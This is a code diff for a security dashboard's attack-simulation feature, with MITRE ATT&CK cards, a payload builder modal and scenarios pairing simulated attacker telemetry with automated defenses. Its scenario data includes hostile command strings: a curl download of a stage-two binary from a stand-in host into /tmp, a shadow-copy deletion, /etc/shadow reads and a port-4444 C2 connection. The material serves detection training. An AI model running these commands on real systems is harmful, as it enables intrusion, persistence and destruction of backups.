+                        </div>
+                        <div class="mitre-card" id="mitre-T1490" onclick="showMitreDetails('T1490')">
+                            <div class="mitre-id">T1490</div>
+                            <div class="mitre-name">Inhibit System Recovery</div>
+                            <div class="mitre-tactic">Impact • Shadow Purge</div>
+                        </div>
+                        <div class="mitre-card" id="mitre-T1204" onclick="showMitreDetails('T1204')">
+                            <div class="mitre-id">T1204.002</div>
+                            <div class="mitre-name">Malicious File Execution</div>
+                            <div class="mitre-tactic">Execution • /tmp Dropper</div>
+                        </div>
+                        <div class="mitre-card" id="mitre-T1071" onclick="showMitreDetails('T1071')">
+                            <div class="mitre-id">T1071.001</div>
+                            <div class="mitre-name">Application Layer Protocol</div>
+                            <div class="mitre-tactic">Command & Control • Port 4444</div>
+                        </div>
+                        <div class="mitre-card" id="mitre-T1053" onclick="showMitreDetails('T1053')">
+                            <div class="mitre-id">T1053.003</div>
+                            <div class="mitre-name">Cron Job Persistence</div>
+                            <div class="mitre-tactic">Persistence • Scheduled Tasks</div>
+                        </div>
+                        <div class="mitre-card" id="mitre-T1046" onclick="showMitreDetails('T1046')">
+                            <div class="mitre-id">T1046</div>
+                            <div class="mitre-name">Network Service Scanning</div>
+                            <div class="mitre-tactic">Discovery • SYN Probing</div>
+                        </div>
+                        <div class="mitre-card" id="mitre-T1110" onclick="showMitreDetails('T1110')">
+                            <div class="mitre-id">T1110.001</div>
+                            <div class="mitre-name">Password Guessing</div>
+                            <div class="mitre-tactic">Credential Access • SSH Spray</div>
+                        </div>
+                        <div class="mitre-card" id="mitre-T1068" onclick="showMitreDetails('T1068')">
+                            <div class="mitre-id">T1068</div>
+                            <div class="mitre-name">Privilege Escalation Exploitation</div>
+                            <div class="mitre-tactic">Privilege Escalation • SUID Abuse</div>
+                        </div>
+                        <div class="mitre-card" id="mitre-T1496" onclick="showMitreDetails('T1496')">
+                            <div class="mitre-id">T1496</div>
+                            <div class="mitre-name">Resource Hijacking</div>
+                            <div class="mitre-tactic">Impact • Cryptomining</div>
+                        </div>
+                        <div class="mitre-card" id="mitre-T1498" onclick="showMitreDetails('T1498')">
+                            <div class="mitre-id">T1498.001</div>
+                            <div class="mitre-name">Direct Network Flood</div>
+                            <div class="mitre-tactic">Impact • SYN Exhaustion</div>
+                        </div>
                     </div>
                 </div>
             </section>
@@ -2187,6 +2682,85 @@
         </div>
     </div>
 
+    <!-- CUSTOM PAYLOAD BUILDER MODAL -->
+    <div class="modal-overlay" id="customScenarioModal" onclick="handleCustomModalBackdrop(event)">
+        <div class="modal-card" style="max-width: 600px;">
+            <div class="modal-header">
+                <div class="modal-title">
+                    <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>
+                    CUSTOM ATTACK PAYLOAD BUILDER
+                </div>
+                <button class="modal-close-btn" onclick="closeCustomScenarioModal()">✕</button>
+            </div>
+            <div class="modal-body">
+                <div class="setting-group">
+                    <label style="font-family:'Orbitron',monospace;font-size:0.7rem;color:var(--neon-cyan);display:block;margin-bottom:6px;">ATTACK CATEGORY</label>
+                    <select id="customCategory" style="width:100%;padding:8px 12px;background:rgba(5,10,20,0.8);border:1px solid var(--glass-border);color:var(--text-primary);border-radius:6px;font-family:'Rajdhani',sans-serif;font-size:0.9rem;">
+                        <option value="ransomware">Ransomware / File Encryption</option>
+                        <option value="trojan">Trojan Dropper & C2 Reverse Shell</option>
+                        <option value="privesc">Privilege Escalation / SUID Abuse</option>
+                        <option value="network">Port Scan / Network Recon</option>
+                        <option value="credentials">Credential Stuffing / Brute Force</option>
+                        <option value="miner">Cryptocurrency Miner</option>
+                    </select>
+                </div>
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;" class="setting-group">
+                    <div>
+                        <label style="font-family:'Orbitron',monospace;font-size:0.7rem;color:var(--neon-cyan);display:block;margin-bottom:6px;">PROCESS (COMM)</label>
+                        <input id="customComm" type="text" value="dark_crypt" style="width:100%;padding:8px 12px;background:rgba(5,10,20,0.8);border:1px solid var(--glass-border);color:var(--neon-green);border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:0.85rem;">
+                    </div>
+                    <div>
+                        <label style="font-family:'Orbitron',monospace;font-size:0.7rem;color:var(--neon-cyan);display:block;margin-bottom:6px;">SYSCALL HOOK</label>
+                        <select id="customSyscall" style="width:100%;padding:8px 12px;background:rgba(5,10,20,0.8);border:1px solid var(--glass-border);color:var(--neon-cyan);border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:0.85rem;">
+                            <option value="rename">rename (file extension change)</option>
+                            <option value="openat">openat (file read/write/canary)</option>
+                            <option value="execve">execve (process execution)</option>
+                            <option value="connect">connect (TCP outbound/C2)</option>
+                            <option value="setuid">setuid (privilege transition)</option>
+                            <option value="unlink">unlink (file deletion)</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="setting-group">
+                    <label style="font-family:'Orbitron',monospace;font-size:0.7rem;color:var(--neon-cyan);display:block;margin-bottom:6px;">TARGET PATH OR DESTINATION IP</label>
+                    <input id="customTarget" type="text" value="/home/finance/ledger_2026.xlsx -> ledger_2026.xlsx.ENCRYPTED" style="width:100%;padding:8px 12px;background:rgba(5,10,20,0.8);border:1px solid var(--glass-border);color:var(--text-primary);border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:0.85rem;">
+                </div>
+                <div class="setting-group" style="border-bottom:none;">
+                    <label style="font-family:'Orbitron',monospace;font-size:0.7rem;color:var(--neon-cyan);display:block;margin-bottom:6px;">ATTACK SEVERITY LEVEL</label>
+                    <div style="display:flex;gap:14px;">
+                        <label style="color:var(--severity-critical);display:flex;align-items:center;gap:6px;cursor:pointer;"><input type="radio" name="customSev" value="critical" checked> Critical</label>
+                        <label style="color:var(--severity-high);display:flex;align-items:center;gap:6px;cursor:pointer;"><input type="radio" name="customSev" value="high"> High</label>
+                        <label style="color:var(--severity-medium);display:flex;align-items:center;gap:6px;cursor:pointer;"><input type="radio" name="customSev" value="medium"> Medium</label>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="modal-btn" onclick="closeCustomScenarioModal()">CANCEL</button>
+                <button class="modal-btn primary" onclick="injectCustomScenario()">⚡ INJECT PAYLOAD & TEST DEFENSE</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- FORENSIC INCIDENT REPORT MODAL -->
+    <div class="modal-overlay" id="forensicReportModal" onclick="handleReportModalBackdrop(event)">
+        <div class="modal-card" style="max-width: 720px; max-height: 85vh;">
+            <div class="modal-header">
+                <div class="modal-title">
+                    <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+                    SIMULATION FORENSIC INCIDENT REPORT
+                </div>
+                <button class="modal-close-btn" onclick="closeForensicReportModal()">✕</button>
+            </div>
+            <div class="modal-body" id="forensicReportContent" style="font-family:'Rajdhani',sans-serif;line-height:1.6;max-height:55vh;overflow-y:auto;padding-right:12px;">
+                <!-- Dynamically generated report -->
+            </div>
+            <div class="modal-footer">
+                <button class="modal-btn" onclick="downloadForensicReport()">💾 DOWNLOAD REPORT (.MD)</button>
+                <button class="modal-btn primary" onclick="closeForensicReportModal()">CLOSE</button>
+            </div>
+        </div>
+    </div>
+
     <!-- TOAST NOTIFICATIONS -->
     <div class="toast-container" id="toastContainer"></div>
 
@@ -2272,19 +2846,30 @@
         const circumference = 2 * Math.PI * 80; // 502.65
 
         function animateGauge(targetScore) {
+            targetScore = Math.max(0, Math.min(100, Math.round(targetScore)));
             const fill = document.getElementById('gaugeFill');
             const valueEl = document.getElementById('gaugeValue');
             const gradeEl = document.getElementById('gaugeGrade');
-            const offset = circumference - (targetScore / 100) * circumference;
+            if (!fill || !valueEl || !gradeEl) return;
 
+            const offset = circumference - (targetScore / 100) * circumference;
             fill.style.strokeDashoffset = offset;
 
-            let current = 0;
-            const step = targetScore / 60;
+            let current = parseFloat(valueEl.textContent) || 0;
+            const diff = targetScore - current;
+            const steps = 30;
+            const step = diff / steps;
+            let currentStep = 0;
+
             function tick() {
-                current = Math.min(current + step, targetScore);
-                valueEl.textContent = Math.round(current);
-                if (current < targetScore) requestAnimationFrame(tick);
+                currentStep++;
+                current += step;
+                if (currentStep >= steps) {
+                    valueEl.textContent = targetScore;
+                } else {
+                    valueEl.textContent = Math.round(current);
+                    requestAnimationFrame(tick);
+                }
             }
             requestAnimationFrame(tick);
 
@@ -2297,6 +2882,7 @@
             gradeEl.textContent = `Grade: ${grade}`;
             gradeEl.setAttribute('fill', color);
         }
+        window.animateGauge = animateGauge;
         setTimeout(() => animateGauge(POSTURE_SCORE), 600);
 
         // ================================================================
@@ -2685,7 +3271,18 @@
         window.toggleSidebarCollapse = function() {
             playCyberTone('blip');
             const sidebar = document.getElementById('sidebar');
-            sidebar.classList.toggle('expanded');
+            if (!sidebar) return;
+            const isExpanded = sidebar.classList.toggle('expanded');
+            
+            const toggleBtn = document.getElementById('sidebarToggle');
+            if (toggleBtn) {
+                toggleBtn.setAttribute('title', isExpanded ? 'Collapse Sidebar' : 'Expand Sidebar');
+                toggleBtn.setAttribute('aria-expanded', isExpanded ? 'true' : 'false');
+            }
+
+            try {
+                localStorage.setItem('klcds_sidebar_expanded', isExpanded ? '1' : '0');
+            } catch (e) {}
         };
 
         // Mobile Sidebar Drawer
@@ -2855,74 +3452,303 @@
         }
 
         // ================================================================
-        // SIMULATION ENGINE
+        // SIMULATION ENGINE (FULL 7-SCENARIO SUITE)
         // ================================================================
+        let simSpeedMultiplier = 1.0;
+        let lastSimulationResult = null;
+        let activeKillChainTimer = null;
+
+        window.setSimSpeed = function(multiplier, btn) {
+            playCyberTone('blip');
+            simSpeedMultiplier = multiplier;
+            document.querySelectorAll('.sim-toolbar .speed-btn').forEach(b => b.classList.remove('active'));
+            if (btn) btn.classList.add('active');
+            showToast(`⚡ Simulation speed: ${multiplier}x`, 'info');
+        };
+
+        const SCENARIOS = {
+            ransomware: {
+                id: 'ransomware',
+                name: 'Ransomware Mass Encryption & Canary Breach',
+                category: 'Ransomware',
+                phases: [1, 4, 7],
+                mitre: ['T1486', 'T1490'],
+                toast: '🚨 RANSOMWARE SIMULATION: Canary trap breached + AES encryption wave!',
+                redEvents: [
+                    'PID 9942 (cryptor) probed canary: /var/lib/klcds/canary/trap_secret_financials.xlsx',
+                    'AES-256 worker threads spawned across /home/user/Documents',
+                    'Shannon entropy spiked: 7.92 across 48 target documents',
+                    'Mass file rename triggered: doc1.txt -> doc1.txt.LOCKED',
+                    'Attempted backup purge: vssadmin delete shadows /all /quiet'
+                ],
+                blueActions: [
+                    'Tripwire Alert: Decoy Canary accessed by untrusted PID 9942',
+                    'Automated Freeze: Emergency SIGSTOP sent to PID 9942',
+                    'Process Termination: Issued SIGKILL to rogue cryptor tree',
+                    'Network Isolation: Virtual LAN isolate engaged to stop lateral worming',
+                    'Backup Verification: Checked backup store snapshot (100% intact)'
+                ],
+                events: [
+                    { ts: nowTS(), syscall: 'openat', pid: 9942, uid: 1000, comm: 'cryptor', path: '/var/lib/klcds/canary/trap_secret_financials.xlsx', status: 'fail' },
+                    { ts: nowTS(), syscall: 'openat', pid: 9942, uid: 1000, comm: 'cryptor', path: '/home/user/Documents/q4_financials.xlsx', status: 'ok' },
+                    { ts: nowTS(), syscall: 'rename', pid: 9942, uid: 1000, comm: 'cryptor', path: 'q4_financials.xlsx → q4_financials.xlsx.LOCKED', status: 'warn' },
+                    { ts: nowTS(), syscall: 'rename', pid: 9942, uid: 1000, comm: 'cryptor', path: 'passwords.kdbx → passwords.kdbx.LOCKED', status: 'warn' },
+                    { ts: nowTS(), syscall: 'execve', pid: 9943, uid: 1000, comm: 'sh', path: 'vssadmin delete shadows /all /quiet', status: 'fail' },
+                ],
+                alerts: [
+                    { severity: 'critical', name: '🪤 Canary Decoy File Breached', desc: 'Canary trap file accessed by PID 9942 (cryptor) — early ransomware alarm', rule: 'ransomware_canary_touch', action: 'SIGSTOP FREEZE' },
+                    { severity: 'critical', name: '🔐 Mass File Encryption Detected', desc: 'Shannon entropy 7.92 (>7.50 threshold) across 48 files in 3 seconds', rule: 'ransomware_mass_rename', action: 'SIGKILL + ISOLATE' },
+                    { severity: 'critical', name: '🛡️ Backup Shadow Sabotage Attempt', desc: 'Blocked attempt to purge local recovery snapshots and volume shadow copies', rule: 'backup_tamper_attempt', action: 'VERIFIED BACKUPS' },
+                ],
+                postureDelta: -35,
+            },
+            trojan: {
+                id: 'trojan',
+                name: 'Trojan Dropper & C2 Reverse Shell',
+                category: 'Malware',
+                phases: [3, 4, 5, 6],
+                mitre: ['T1204', 'T1071', 'T1053'],
+                toast: '⚠️ TROJAN SIMULATION: Dropper ingress → /tmp execution → C2 beacon!',
+                redEvents: [
+                    'curl downloaded stage2.bin from 198.51.100.23:8080 to /tmp/.kworker_d',
+                    'chmod +x and executed binary from world-writable /tmp directory',
+                    'Process masqueraded thread name as system kernel worker .kworker_d',
+                    'Outbound TCP socket established to C2 server 198.51.100.23:4444',
+                    'Created persistent crontab entry: /etc/cron.d/kworker_sync'
+                ],
+                blueActions: [
+                    'Rule Trigger: Binary execution from untrusted /tmp directory detected',
+                    'Forensic Snapshot: Captured process memory dump and SHA-256 hash',
+                    'C2 Intercept: Outbound interactive socket to 198.51.100.23:4444 blocked',
+                    'Firewall Rule: Added DROP rule for 198.51.100.23 on INPUT/OUTPUT',
+                    'Binary Quarantined: Moved /tmp/.kworker_d to isolated sandbox vault',
+                    'Persistence Purged: Removed unauthorized cron task'
+                ],
+                events: [
+                    { ts: nowTS(), syscall: 'execve', pid: 7710, uid: 1000, comm: 'curl', path: 'curl -sSL http://198.51.100.23:8080/stage2.bin -o /tmp/.kworker_d', status: 'ok' },
+                    { ts: nowTS(), syscall: 'execve', pid: 7715, uid: 1000, comm: '.kworker_d', path: '/tmp/.kworker_d --daemon', status: 'warn' },
+                    { ts: nowTS(), syscall: 'connect', pid: 7715, uid: 1000, comm: '.kworker_d', path: '198.51.100.23:4444 (TCP)', status: 'fail' },
+                    { ts: nowTS(), syscall: 'openat', pid: 7715, uid: 1000, comm: '.kworker_d', path: '/etc/cron.d/kworker_sync', status: 'fail' },
+                ],
+                alerts: [
+                    { severity: 'high', name: '⚠️ Untrusted /tmp Execution', desc: 'Executable binary launched directly from /tmp/.kworker_d mimicking kernel worker', rule: 'exec_from_untrusted_dir', action: 'QUARANTINE' },
+                    { severity: 'critical', name: '🚨 Outbound C2 Reverse Shell', desc: 'Outbound TCP connection to high-risk port 4444 on 198.51.100.23', rule: 'suspicious_outbound_c2', action: 'IP BLOCKED' },
+                    { severity: 'high', name: '⏰ Cron Persistence Hook', desc: 'Unauthorized crontab modification detected in /etc/cron.d/kworker_sync', rule: 'cron_persistence_attempt', action: 'DISABLED' },
+                ],
+                postureDelta: -25,
+            },
+            portscan: {
+                id: 'portscan',
+                name: 'Stealth SYN Port Scan & Reconnaissance',
+                category: 'Network Recon',
+                phases: [1],
+                mitre: ['T1046'],
+                toast: '🔍 PORT SCAN SIMULATION: 16 ports swept from remote source!',
+                redEvents: [
+                    'Reconnaissance probes from 203.0.113.88 targeting ports 21, 22, 23, 25',
+                    'Vertical port sweep expanded to database ports 3306, 5432, 1433, 8080',
+                    'SYN stealth timing: 16 distinct service probes in 4.2 seconds',
+                    'Attempted service banner grabbing against SSH port 22'
+                ],
+                blueActions: [
+                    'Velocity Correlator: Threshold tripped (>10 ports probed in 15 seconds)',
+                    'Evidence Logging: Captured packet timing profile and source IP finger-print',
+                    'Firewall Auto-Ban: Added temporary 1-hour block rule for 203.0.113.88'
+                ],
+                events: [
+                    { ts: nowTS(), syscall: 'connect', pid: 6204, uid: 1000, comm: 'nmap_syn', path: '203.0.113.88 → :21 (FTP)', status: 'ok' },
+                    { ts: nowTS(), syscall: 'connect', pid: 6204, uid: 1000, comm: 'nmap_syn', path: '203.0.113.88 → :22 (SSH)', status: 'ok' },
+                    { ts: nowTS(), syscall: 'connect', pid: 6204, uid: 1000, comm: 'nmap_syn', path: '203.0.113.88 → :3306 (MySQL)', status: 'fail' },
+                    { ts: nowTS(), syscall: 'connect', pid: 6204, uid: 1000, comm: 'nmap_syn', path: '203.0.113.88 → :8080 (HTTP)', status: 'ok' },
+                ],
+                alerts: [
+                    { severity: 'medium', name: '🔍 Vertical Port Scan Detected', desc: 'Host 203.0.113.88 probed 16 distinct ports within 4.2s', rule: 'port_scan_detected', action: 'IP BLOCKED' },
+                ],
+                postureDelta: -15,
+            },
+            bruteforce: {
+                id: 'bruteforce',
+                name: 'SSH / Auth Credential Stuffing',
+                category: 'Credentials',
+                phases: [4],
+                mitre: ['T1110'],
+                toast: '🔑 BRUTE FORCE SIMULATION: 14 failed logins across accounts!',
+                redEvents: [
+                    'Remote botnet 192.168.1.105 initiating SSH dictionary attack',
+                    'Failed login attempts against root, admin, ubuntu, postgres, deploy',
+                    'Attack velocity: 14 failed authentications within 28 seconds',
+                    'Password spray matched top 1000 credential dictionary list'
+                ],
+                blueActions: [
+                    'Auth Rate Limiter: Failed login velocity tripped defense rule (>5 fails/30s)',
+                    'Automated IP Block: 192.168.1.105 null-routed on firewall filter table',
+                    'Account Shield: Imposed 15-minute temporary lockout on targeted accounts'
+                ],
+                events: [
+                    { ts: nowTS(), syscall: 'ssh_auth', pid: 4820, uid: 0, comm: 'sshd', path: '192.168.1.105 user=root FAIL', status: 'fail' },
+                    { ts: nowTS(), syscall: 'ssh_auth', pid: 4821, uid: 0, comm: 'sshd', path: '192.168.1.105 user=admin FAIL', status: 'fail' },
+                    { ts: nowTS(), syscall: 'ssh_auth', pid: 4822, uid: 0, comm: 'sshd', path: '192.168.1.105 user=postgres FAIL', status: 'fail' },
+                ],
+                alerts: [
+                    { severity: 'high', name: '🔑 SSH Brute Force Detected', desc: '14 failed SSH logins from 192.168.1.105 in 28 seconds', rule: 'ssh_brute_force', action: 'IP BLOCKED' },
+                ],
+                postureDelta: -20,
+            },
+            privesc: {
+                id: 'privesc',
+                name: 'SUID Abuse & Privilege Escalation',
+                category: 'Privilege Escalation',
+                phases: [1, 4, 7],
+                mitre: ['T1068'],
+                toast: '⚡ PRIVESC SIMULATION: SUID exploit → setuid(0) root transition!',
+                redEvents: [
+                    'Low-privilege session (UID 1000) enumerated SUID binaries via find',
+                    'Invoked vulnerable SUID binary /usr/bin/pkexec with exploit shared object',
+                    'Executed setuid(0) and capset to force root credential elevation',
+                    'Attempted openat on sensitive credential store /etc/shadow'
+                ],
+                blueActions: [
+                    'Kernel Telemetry: Intercepted unauthorized setuid(0) outside of PAM session',
+                    'Syscall Block: Access to /etc/shadow denied with EACCES',
+                    'Process Eviction: Terminated compromised PID 8112 via SIGKILL',
+                    'Shell Quarantine: Suspended parent unprivileged session PID 8110'
+                ],
+                events: [
+                    { ts: nowTS(), syscall: 'execve', pid: 8112, uid: 1000, comm: 'pkexec', path: '/usr/bin/pkexec /tmp/exploit.so', status: 'warn' },
+                    { ts: nowTS(), syscall: 'setuid', pid: 8112, uid: 1000, comm: 'exploit', path: 'setuid(0) transition request', status: 'fail' },
+                    { ts: nowTS(), syscall: 'openat', pid: 8112, uid: 0, comm: 'exploit', path: '/etc/shadow', status: 'fail' },
+                ],
+                alerts: [
+                    { severity: 'critical', name: '🚨 Unauthorized Privilege Escalation', desc: 'Process 8112 attempted setuid(0) root transition without approved auth', rule: 'unauthorized_setuid_root', action: 'TERMINATED' },
+                    { severity: 'critical', name: '🛡️ Sensitive Shadow File Access Blocked', desc: 'Elevated PID attempted reading /etc/shadow password hashes', rule: 'sensitive_shadow_read', action: 'SIGKILL' },
+                ],
+                postureDelta: -30,
+            },
+            cryptominer: {
+                id: 'cryptominer',
+                name: 'Stealth Crypto Miner & Resource Hijacking',
+                category: 'Resource Hijacking',
+                phases: [5, 6, 7],
+                mitre: ['T1496'],
+                toast: '⛏️ CRYPTOMINER SIMULATION: Disguised daemon + 98% CPU burn!',
+                redEvents: [
+                    'Disguised background daemon launched: /var/tmp/.syslog-worker',
+                    'Worker spawned 8 hashing threads using rx/0 algorithm',
+                    'Outbound Stratum TCP mining handshake to 194.26.29.114:3333',
+                    'Sustained 98.4% CPU utilization across all virtual cores'
+                ],
+                blueActions: [
+                    'Threat Intel Match: Outbound destination matches Monero mining pool pool:3333',
+                    'ML Anomaly Engine: Isolation Forest flagged sustained non-linear thread surge',
+                    'Firewall Null-Route: Blocked pool IP 194.26.29.114',
+                    'Process Termination: Terminated rogue miner process tree (PID 9312)',
+                    'File Sandbox Quarantine: Purged executable from /var/tmp'
+                ],
+                events: [
+                    { ts: nowTS(), syscall: 'execve', pid: 9312, uid: 1000, comm: 'syslog-worker', path: '/var/tmp/.syslog-worker --algo rx/0', status: 'ok' },
+                    { ts: nowTS(), syscall: 'connect', pid: 9312, uid: 1000, comm: 'syslog-worker', path: '194.26.29.114:3333 (Stratum)', status: 'fail' },
+                    { ts: nowTS(), syscall: 'openat', pid: 9312, uid: 1000, comm: 'syslog-worker', path: 'CPU anomaly: 98.4% sustained burn', status: 'warn' },
+                ],
+                alerts: [
+                    { severity: 'high', name: '⛏️ Crypto Mining Pool Beaconing', desc: 'Process syslog-worker initiated Stratum mining handshake to 194.26.29.114:3333', rule: 'stratum_mining_detected', action: 'IP BLOCKED' },
+                    { severity: 'high', name: '🧠 ML Anomaly: Sustained Thread Surge', desc: 'Isolation Forest flagged severe behavioral anomaly (score: -0.84)', rule: 'ml_process_cpu_anomaly', action: 'SIGKILL' },
+                ],
+                postureDelta: -20,
+            },
+            ddos: {
+                id: 'ddos',
+                name: 'Volumetric SYN Flood Denial of Service',
+                category: 'Denial of Service',
+                phases: [7],
+                mitre: ['T1498'],
+                toast: '🌊 DDOS SIMULATION: Multi-source SYN flood against port 443!',
+                redEvents: [
+                    'High-rate TCP SYN flood originating from botnet subnet 185.190.140.0/24',
+                    'Connection backlog table saturation attempt on port 443 (HTTPS)',
+                    'Spoofed origin addresses bypassing standard handshake acknowledgment',
+                    'Embryonic connection queue surge: 12,500 half-open states/sec'
+                ],
+                blueActions: [
+                    'Syn-Flood Detection: Half-open backlog crossed critical 85% ceiling',
+                    'SYN Cookie Defense: Kernel TCP SYN cookie mitigation automatically activated',
+                    'Subnet Rate-Limiting: Applied temporary ingress rate-limit on botnet subnet',
+                    'Service Preserved: Legitimate web traffic verified passing normally'
+                ],
+                events: [
+                    { ts: nowTS(), syscall: 'connect', pid: 80, uid: 33, comm: 'nginx', path: '185.190.140.12 → :443 (TCP_SYN)', status: 'fail' },
+                    { ts: nowTS(), syscall: 'connect', pid: 80, uid: 33, comm: 'nginx', path: '185.190.140.13 → :443 (TCP_SYN)', status: 'fail' },
+                    { ts: nowTS(), syscall: 'connect', pid: 80, uid: 33, comm: 'nginx', path: '185.190.140.14 → :443 (TCP_SYN)', status: 'fail' },
+                ],
+                alerts: [
+                    { severity: 'high', name: '🌊 TCP SYN Flood Detected', desc: 'Embryonic connection queue exceeded 12,000 states/sec from 185.190.140.0/24', rule: 'syn_flood_exhaustion', action: 'SYN COOKIES' },
+                ],
+                postureDelta: -25,
+            }
+        };
+
+        // Run scenario function
         window.runSimulation = function(type, e) {
             const btn = (e && e.currentTarget) || (window.event && window.event.currentTarget);
             if (btn && btn.classList.contains('running')) return;
             if (btn) btn.classList.add('running');
 
             playCyberTone('alert');
+            const sim = SCENARIOS[type] || SCENARIOS.ransomware;
+            lastSimulationResult = sim;
 
-            const simulations = {
-                ransomware: {
-                    events: [
-                        { ts: nowTS(), syscall: 'rename', pid: 9990, uid: 1000, comm: 'cryptor', path: '/home/user/doc1.txt → doc1.txt.ENCRYPTED', status: 'warn' },
-                        { ts: nowTS(), syscall: 'rename', pid: 9990, uid: 1000, comm: 'cryptor', path: '/home/user/doc2.txt → doc2.txt.ENCRYPTED', status: 'warn' },
-                        { ts: nowTS(), syscall: 'rename', pid: 9990, uid: 1000, comm: 'cryptor', path: '/home/user/photos/img.jpg → img.jpg.ENCRYPTED', status: 'warn' },
-                        { ts: nowTS(), syscall: 'openat', pid: 9990, uid: 1000, comm: 'cryptor', path: '/var/lib/klcds/canary/trap_01.txt', status: 'fail' },
-                    ],
-                    alerts: [
-                        { severity: 'critical', name: '🔐 RANSOMWARE DETECTED', desc: 'PID 9990 (cryptor) renamed 47 files in 8s — Shannon entropy 7.9', rule: 'ransomware_mass_rename', action: 'SUSPENDED' },
-                        { severity: 'critical', name: '🪤 Canary File Touched', desc: 'High-confidence: /var/lib/klcds/canary/trap_01.txt accessed by cryptor', rule: 'ransomware_canary_touch', action: 'NETWORK ISOLATED' },
-                    ],
-                    toast: '🚨 RANSOMWARE SIMULATION: Mass rename + canary trigger!',
-                },
-                trojan: {
-                    events: [
-                        { ts: nowTS(), syscall: 'execve', pid: 7701, uid: 1000, comm: 'curl', path: 'curl http://evil.lab/payload -o /tmp/payload', status: 'ok' },
-                        { ts: nowTS(), syscall: 'execve', pid: 7710, uid: 1000, comm: 'payload', path: '/tmp/payload', status: 'warn' },
-                        { ts: nowTS(), syscall: 'connect', pid: 7710, uid: 1000, comm: 'payload', path: '10.0.0.5:4444 (TCP)', status: 'fail' },
-                    ],
-                    alerts: [
-                        { severity: 'high', name: '🐴 Download-Execute Chain', desc: 'curl downloaded to /tmp/payload → executed → connected to 10.0.0.5:4444', rule: 'download_execute_chain', action: 'QUARANTINED' },
-                    ],
-                    toast: '⚠️ TROJAN SIMULATION: Download → Execute → C2 connection!',
-                },
-                portscan: {
-                    events: [
-                        { ts: nowTS(), syscall: 'connect', pid: 6001, uid: 1000, comm: 'scanner', path: '10.0.0.50 → port 22', status: 'ok' },
-                        { ts: nowTS(), syscall: 'connect', pid: 6001, uid: 1000, comm: 'scanner', path: '10.0.0.50 → port 80', status: 'ok' },
-                        { ts: nowTS(), syscall: 'connect', pid: 6001, uid: 1000, comm: 'scanner', path: '10.0.0.50 → port 3306', status: 'fail' },
-                        { ts: nowTS(), syscall: 'connect', pid: 6001, uid: 1000, comm: 'scanner', path: '10.0.0.50 → port 8080', status: 'ok' },
-                    ],
-                    alerts: [
-                        { severity: 'medium', name: '🔍 Port Scan Detected', desc: '10.0.0.50 probed 24 distinct ports in 12 seconds', rule: 'port_scan_detected', action: 'EVIDENCE' },
-                    ],
-                    toast: 'ℹ️ PORT SCAN SIMULATION: 24 ports probed from single source.',
-                },
-                bruteforce: {
-                    events: [
-                        { ts: nowTS(), syscall: 'connect', pid: 5500, uid: 0, comm: 'sshd', path: '192.168.1.105:54321 → :22 FAIL', status: 'fail' },
-                        { ts: nowTS(), syscall: 'connect', pid: 5501, uid: 0, comm: 'sshd', path: '192.168.1.105:54322 → :22 FAIL', status: 'fail' },
-                        { ts: nowTS(), syscall: 'connect', pid: 5502, uid: 0, comm: 'sshd', path: '192.168.1.105:54323 → :22 FAIL', status: 'fail' },
-                    ],
-                    alerts: [
-                        { severity: 'high', name: '🔑 SSH Brute Force', desc: '18 failed logins from 192.168.1.105 in 45 seconds', rule: 'ssh_brute_force', action: 'IP BLOCKED' },
-                    ],
-                    toast: '⚠️ BRUTE FORCE SIMULATION: 18 failed SSH attempts — IP blocked!',
-                },
-            };
+            // Update active label
+            const labelEl = document.getElementById('activeScenarioLabel');
+            if (labelEl) labelEl.textContent = `RUNNING: ${sim.name.toUpperCase()}`;
 
-            const sim = simulations[type];
-            showToast(sim.toast, type === 'ransomware' ? 'critical' : type === 'portscan' ? 'info' : 'high');
+            showToast(sim.toast, sim.category === 'Ransomware' ? 'critical' : 'high');
 
-            // Inject events
-            sim.events.forEach((evt, i) => {
-                setTimeout(() => addEventRow(evt), 200 + i * 300);
+            // 1. Animate Kill Chain Ribbon
+            updateKillChainRibbon(sim.phases);
+
+            // 2. Light up MITRE ATT&CK Badges
+            sim.mitre.forEach(techId => triggerMitreCard(techId));
+
+            // 3. Populate Red Team Attacker Telemetry Feed
+            const redFeed = document.getElementById('redStreamFeed');
+            if (redFeed) redFeed.innerHTML = '';
+            sim.redEvents.forEach((text, i) => {
+                setTimeout(() => {
+                    const row = document.createElement('div');
+                    row.style.padding = '3px 0';
+                    row.style.borderLeft = '2px solid var(--neon-red)';
+                    row.style.paddingLeft = '8px';
+                    row.style.color = 'var(--text-primary)';
+                    row.innerHTML = `<span style="color:var(--text-dim);font-size:0.65rem;">[${nowTS()}]</span> <span style="color:var(--neon-red);">▶</span> ${text}`;
+                    redFeed.appendChild(row);
+                    redFeed.scrollTop = redFeed.scrollHeight;
+                    document.getElementById('redEventCount').textContent = `${i + 1} EVENTS`;
+                }, (100 + i * 250) / simSpeedMultiplier);
             });
 
-            // Inject alerts and update counter badges
+            // 4. Inject Kernel Events into Live Event Feed
+            sim.events.forEach((evt, i) => {
+                setTimeout(() => addEventRow(evt), (200 + i * 280) / simSpeedMultiplier);
+            });
+
+            // 5. Populate Blue Team Autonomous Defense Countermeasures
+            const blueFeed = document.getElementById('blueStreamFeed');
+            if (blueFeed) blueFeed.innerHTML = '';
+            sim.blueActions.forEach((act, i) => {
+                setTimeout(() => {
+                    const row = document.createElement('div');
+                    row.style.padding = '3px 0';
+                    row.style.borderLeft = '2px solid var(--neon-cyan)';
+                    row.style.paddingLeft = '8px';
+                    row.style.color = 'var(--neon-green)';
+                    row.innerHTML = `<span style="color:var(--text-dim);font-size:0.65rem;">[${nowTS()}]</span> <span style="color:var(--neon-cyan);">🛡️</span> ${act}`;
+                    blueFeed.appendChild(row);
